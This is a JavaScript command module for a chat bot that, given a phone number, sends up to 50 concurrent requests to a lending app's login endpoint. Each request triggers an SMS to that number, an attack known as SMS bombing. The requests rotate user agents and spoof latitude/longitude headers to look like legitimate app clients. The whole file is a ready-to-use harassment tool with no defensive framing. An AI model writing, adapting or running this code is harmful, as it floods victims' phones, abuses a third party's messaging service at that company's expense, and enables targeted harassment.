const axios = require('axios');
const random = require('random');

module.exports.config = {
  name: "smsbomb",
  version: "2.1.0",
  role: 2, // Bot owner only for safety
  credits: "selov",
  description: "Send SMS bomb to phone number",
  commandCategory: "utility",
  usages: "/smsbomb <phone> [threads]",
  cooldowns: 30
};

// Define the sendBomb function INSIDE the run function
module.exports.run = async function ({ api, event, args }) {
  const { threadID, messageID, senderID } = event;

  // Define sendBomb inside run - this is the proper way
  const sendBomb = async (phone, threads = 30) => {
    const coordinates = [
      { lat: '14.5995', long: '120.9842' },
      { lat: '14.6760', long: '121.0437' },
      { lat: '14.8648', long: '121.0418' }
    ];

    const userAgents = [
      'okhttp/4.12.0',
      'okhttp/4.9.2',
      'Dart/3.6 (dart:io)'
    ];

    let successes = 0;
    let failures = 0;

    const bombSingleThread = async () => {
      try {
        const coord = random.pick(coordinates);
        const agent = random.pick(userAgents);

        const data = {
          domain: phone,
          cat: 'login',
          previous: false,
          financial: 'efe35521e51f924efcad5d61d61072a9'
        };

        const headers = {
          'User-Agent': agent,
          'Content-Type': 'application/json; charset=utf-8',
          'x-latitude': coord.lat,
          'x-longitude': coord.long
        };

        await axios.post(
          'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
          data,
          { headers, timeout: 10000 }
        );

        successes++;
      } catch (err) {
        failures++;
      }
    };

    // Create array of promises
    const promises = [];
    for (let i = 0; i < threads; i++) {
      promises.push(bombSingleThread());
    }

    // Wait for all to complete
    await Promise.allSettled(promises);

    const successRate = threads > 0 ? ((successes / threads) * 100).toFixed(2) : "0.00";

    return {
      phone: phone,
      threads: threads,
      successes: successes,
      failures: failures,
      successRate: successRate
    };
  };

  // Main command logic
  try {
    // Parse arguments
    const phone = args[0];
    const threads = args[1] ? parseInt(args[1]) : 30;

    // Validate phone number
    if (!phone) {
      return api.sendMessage(
        "❌ Please provide a phone number.\n\nUsage: /smsbomb <phone> [threads]\nExample: /smsbomb 09450807xxx 30",
        threadID,
        messageID
      );
    }

    // Validate threads number
    if (isNaN(threads) || threads < 1 || threads > 50) {
      return api.sendMessage(
        "❌ Threads must be between 1-50.",
        threadID,
        messageID
      );
    }

    // Send initial message
    const waiting = await api.sendMessage(
      `📱 **SMS BOMB STARTED**\n━━━━━━━━━━━━━━━━\n📞 Phone: ${phone}\n⚡ Threads: ${threads}\n⏳ Please wait...`,
      threadID
    );

    // Execute the bomb
    const results = await sendBomb(phone, threads);

    // Prepare result message
    const resultMsg = 
      `📱 **SMS BOMB COMPLETE**\n━━━━━━━━━━━━━━━━\n` +
      `📞 **Phone:** ${results.phone}\n` +
      `⚡ **Threads:** ${results.threads}\n` +
      `✅ **Success:** ${results.successes}\n` +
      `❌ **Failed:** ${results.failures}\n` +
      `📊 **Success Rate:** ${results.successRate}%\n` +
      `━━━━━━━━━━━━━━━━\n` +
      `💬 Request completed!`;

    // Update waiting message
    await api.editMessage(resultMsg, waiting.messageID);

  } catch (err) {
    console.error("SMS Command Error:", err);
    api.sendMessage(`❌ Error: ${err.message}`, threadID, messageID);
  }
};
